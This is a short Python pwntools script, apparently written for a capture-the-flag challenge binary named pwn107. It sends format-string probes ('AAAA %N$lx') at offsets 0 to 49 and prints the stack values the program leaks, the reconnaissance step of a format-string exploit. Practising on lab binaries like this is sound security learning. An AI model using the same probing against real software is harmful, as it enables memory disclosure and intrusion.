from pwn import *

e = ELF("./pwn107.pwn107")

for i in range(50):
        io = e.process(level="error")
        io.recvuntil('streak? ')
        io.sendline("AAAA %%%d$lx" % i)
        io.recvline()
        io.recvuntil("AAAA ")
        print("%d - %s" % (i, io.recvline().strip()))
        io.close()
